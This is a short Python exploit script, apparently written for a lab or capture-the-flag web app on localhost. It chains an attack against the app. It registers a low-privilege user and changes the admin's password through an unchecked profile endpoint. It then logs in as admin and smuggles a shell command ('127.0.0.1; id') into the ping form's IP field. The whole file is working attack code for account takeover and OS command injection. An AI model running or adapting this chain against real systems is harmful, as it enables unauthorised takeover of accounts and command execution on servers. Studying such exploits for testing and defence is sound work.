import requests

payload = "id"

s = requests.Session()

r = s.post("http://localhost:8080/register", {"username": "bob", "password":"123", "confirm":"123"})
print(f"Registering User: {r.text}")

r = s.post("http://localhost:8080/login", {"username": "bob", "password":"123"})
print(f"Logging in as User: {r.text}")

r = s.post("http://localhost:8080/profile/1/changePassword", {"password": "admin", "confirm":"admin"})
print(f"Changing Admin Password: {r.text}")

r = s.post("http://localhost:8080/login", {"username": "admin", "password":"admin"})
print(f"Logging in as Admin: {r.text}")

r = s.post("http://localhost:8080/admin/ping", {"ip":f"127.0.0.1; {payload}"})
print(f"Running Command Injection: {r.text}")